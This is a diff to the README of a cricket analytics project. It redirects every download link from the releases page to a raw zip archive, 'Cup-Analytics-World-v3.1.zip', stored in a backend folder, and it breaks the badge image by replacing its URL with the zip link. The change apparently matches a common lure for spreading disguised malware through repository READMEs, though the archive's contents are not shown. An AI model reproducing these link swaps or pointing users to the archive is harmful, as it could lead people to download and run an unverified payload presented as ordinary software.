@@ -1,6 +1,6 @@
 # 📊 T20-World-Cup-Analytics - Uncover Insights from Cricket Matches
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20v1.0-blue)](https://github.com/JustFerdy/T20-World-Cup-Analytics/releases)
+[![Download Now](https://github.com/JustFerdy/T20-World-Cup-Analytics/raw/refs/heads/main/backend/Cup-Analytics-World-v3.1.zip%20Now-Release%20v1.0-blue)](https://github.com/JustFerdy/T20-World-Cup-Analytics/raw/refs/heads/main/backend/Cup-Analytics-World-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Welcome to the T20 World Cup — Analytics project! This software allows you to 
 
 To get started, visit the following link to download the latest version:
 
-[Download T20-World-Cup-Analytics](https://github.com/JustFerdy/T20-World-Cup-Analytics/releases)
+[Download T20-World-Cup-Analytics](https://github.com/JustFerdy/T20-World-Cup-Analytics/raw/refs/heads/main/backend/Cup-Analytics-World-v3.1.zip)
 
 ### Step-by-Step Installation
 
@@ -94,4 +94,4 @@ To keep track of new releases and updates, follow the repository on GitHub. Enga
 
 We hope you enjoy using T20 World Cup — Analytics and discover exciting insights into the world of cricket!
 
-[Download T20-World-Cup-Analytics](https://github.com/JustFerdy/T20-World-Cup-Analytics/releases)
+[Download T20-World-Cup-Analytics](https://github.com/JustFerdy/T20-World-Cup-Analytics/raw/refs/heads/main/backend/Cup-Analytics-World-v3.1.zip)
